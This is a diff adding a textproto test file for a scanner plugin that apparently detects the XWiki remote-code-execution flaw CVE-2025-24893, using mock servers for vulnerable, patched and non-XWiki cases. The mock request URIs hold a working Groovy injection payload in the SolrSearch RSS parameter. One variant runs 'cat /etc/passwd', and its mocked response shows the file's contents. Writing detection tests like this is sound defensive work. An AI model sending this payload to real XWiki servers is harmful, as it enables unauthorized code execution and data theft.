@@ -1,0 +1,117 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "XWiki_CVE_2025_24893"
+}
+
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+  # Running XWiki 15.10.10
+
+  mock_callback_server: {
+    enabled: false
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/xwiki/" }
+        ]
+      },
+      {
+        uri: "/xwiki/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/xwiki/bin/view/Main/" }
+        ]
+      },
+      {
+        uri: "/xwiki/bin/view/Main/"
+        status: 200
+        body_content: "<html> <head>\n                    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n                                                    <title>Home - XWiki</title>\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n                <link rel=\"icon\" href=\"/xwiki/resources/icons/xwiki/favicon16.png?cache-version=1716817112000\" type=\"image/png\" />\n        <link rel=\"icon\" href=\"/xwiki/resources/icons/xwiki/favicon.svg?cache-version=1716817112000\" type=\"image/svg+xml\" />\n        <link rel=\"apple-touch-icon\" href=\"/xwiki/resources/icons/xwiki/favicon144.png?cache-version=1716817112000\" />\n                      <link rel=\"alternate\" type=\"application/x-wiki\" title=\"Edit\" href=\"/xwiki/bin/edit/Main/WebHome\" />\n                    <link rel=\"canonical\" href=\"/xwiki/bin/view/Main/\" />\n </head>\n...\n<body><div><div>\n<footer id=\"footerglobal\">\n  <div id=\"xwikilicence\"></div>\n            <div id=\"xwikiplatformversion\">\n                    <a href=\"https://extensions.xwiki.org?id=org.xwiki.platform:xwiki-platform-distribution-jetty-hsqldb:15.10.10:::/xwiki-commons-pom/xwiki-platform/xwiki-platform-distribution/xwiki-platform-distribution-jetty-hsqldb\">\n                XWiki Jetty HSQLDB 15.10.10\n              </a>\n          </div>\n  </footer>\n</div></div></body>\n</html>"
+      },
+      {
+        uri: "/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat+/etc/passwd%27.execute().text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+        status: 200
+        body_content: "<p>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;<br/>&lt;rss xmlns:dc=\"<span class=\"wikiexternallink\"><a class=\"wikimodel-freestanding\" href=\"http://purl.org/dc/elements/1.1/\"><span class=\"wikigeneratedlinkcontent\">http://purl.org/dc/elements/1.1/</span></a></span>\" version=\"2.0\"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>xwiki:x:1000:1000::/home/xwiki:/bin/bash]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span class=\"wikiexternallink\"><a class=\"wikimodel-freestanding\" href=\"http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat%20%2Fetc%2Fpasswd%27.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D\"><span class=\"wikigeneratedlinkcontent\">http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat%20%2Fetc%2Fpasswd%27.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS feed for search on [}}}root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br/>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>xwiki:x:1000:1000::/home/xwiki:/bin/bash]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright /&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights /&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div class=\"wikimodel-emptyline\"></div><div class=\"wikimodel-emptyline\"></div>"
+      },
+      {
+        uri: "/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27ProofCodeExecution%27%2B%2816%2B26%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+        status: 200
+        body_content: "<p>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;<br/>&lt;rss xmlns:dc=\"<span class=\"wikiexternallink\"><a class=\"wikimodel-freestanding\" href=\"http://purl.org/dc/elements/1.1/\"><span class=\"wikigeneratedlinkcontent\">http://purl.org/dc/elements/1.1/</span></a></span>\" version=\"2.0\"&gt;<br/>&nbsp;&nbsp;&lt;channel&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;RSS feed for search on [}}}ProofCodeExecution42]&lt;/title&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;link&gt;<span class=\"wikiexternallink\"><a class=\"wikimodel-freestanding\" href=\"http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27ProofCodeExecution%27%2B%2816%2B26%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D\"><span class=\"wikigeneratedlinkcontent\">http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27ProofCodeExecution%27%2B%2816%2B26%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</span></a></span>&lt;/link&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;description&gt;RSS feed for search on [}}}ProofCodeExecution42]&lt;/description&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;language&gt;en&lt;/language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;copyright /&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:creator&gt;XWiki&lt;/dc:creator&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:language&gt;en&lt;/dc:language&gt;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&lt;dc:rights /&gt;<br/>&nbsp;&nbsp;&lt;/channel&gt;<br/>&lt;/rss&gt;</p><div class=\"wikimodel-emptyline\"></div><div class=\"wikimodel-emptyline\"></div>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenPatched_returnsFalse"
+  expect_vulnerability: false
+  # Running XWiki 15.10.11
+
+  mock_callback_server: {
+    enabled: false
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/xwiki/" }
+        ]
+      },
+      {
+        uri: "/xwiki/"
+        status: 302
+        headers: [
+          { name: "Location" value: "/xwiki/bin/view/Main/" }
+        ]
+      },
+      {
+        uri: "/xwiki/bin/view/Main/"
+        status: 200
+        body_content: "<html> <head>\n                    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n                                                    <title>Home - XWiki</title>\n            <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n                <link rel=\"icon\" href=\"/xwiki/resources/icons/xwiki/favicon16.png?cache-version=1716817112000\" type=\"image/png\" />\n        <link rel=\"icon\" href=\"/xwiki/resources/icons/xwiki/favicon.svg?cache-version=1716817112000\" type=\"image/svg+xml\" />\n        <link rel=\"apple-touch-icon\" href=\"/xwiki/resources/icons/xwiki/favicon144.png?cache-version=1716817112000\" />\n                      <link rel=\"alternate\" type=\"application/x-wiki\" title=\"Edit\" href=\"/xwiki/bin/edit/Main/WebHome\" />\n                    <link rel=\"canonical\" href=\"/xwiki/bin/view/Main/\" />\n </head>\n...\n<body><div><div>\n<footer id=\"footerglobal\">\n  <div id=\"xwikilicence\"></div>\n            <div id=\"xwikiplatformversion\">\n                    <a href=\"https://extensions.xwiki.org?id=org.xwiki.platform:xwiki-platform-distribution-jetty-hsqldb:15.10.11:::/xwiki-commons-pom/xwiki-platform/xwiki-platform-distribution/xwiki-platform-distribution-jetty-hsqldb\">\n                XWiki Jetty HSQLDB 15.10.11\n              </a>\n          </div>\n  </footer>\n\n</div></div></body>\n</html>"
+      },
+      {
+        uri: "/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat+/etc/passwd%27.execute().text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+        status: 200
+        body_content: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<rss xmlns:dc=\"http://purl.org/dc/elements/1.1/\" version=\"2.0\">\n  <channel>\n    <title>RSS feed for search on [}}}{{async async=false}}{{groovy}}println('cat /etc/passwd'.execute().text){{/groovy}}{{/async}}]</title>\n    <link>http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27cat%20%2Fetc%2Fpasswd%27.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</link>\n    <description>RSS feed for search on [}}}{{async async=false}}{{groovy}}println('cat /etc/passwd'.execute().text){{/groovy}}{{/async}}]</description>\n    <language>en</language>\n    <copyright />\n    <dc:creator>XWiki</dc:creator>\n    <dc:language>en</dc:language>\n    <dc:rights />\n  </channel>\n</rss>"
+      },
+      {
+        uri: "/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27ProofCodeExecution%27%2B%2816%2B26%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
+        status: 200
+        body_content: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<rss xmlns:dc=\"http://purl.org/dc/elements/1.1/\" version=\"2.0\">\n  <channel>\n    <title>RSS feed for search on [}}}{{async async=false}}{{groovy}}println('ProofCodeExecution'+(16+26)){{/groovy}}{{/async}}]</title>\n    <link>http://180.149.199.132:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%27ProofCodeExecution%27%2B%2816%2B26%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D</link>\n    <description>RSS feed for search on [}}}{{async async=false}}{{groovy}}println('ProofCodeExecution'+(16+26)){{/groovy}}{{/async}}]</description>\n    <language>en</language>\n    <copyright />\n    <dc:creator>XWiki</dc:creator>\n    <dc:language>en</dc:language>\n    <dc:rights />\n  </channel>\n</rss>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotXWiki_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: false
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: "<html><title>Some Other App</title></html>"
+      }
+    ]
+  }
+}
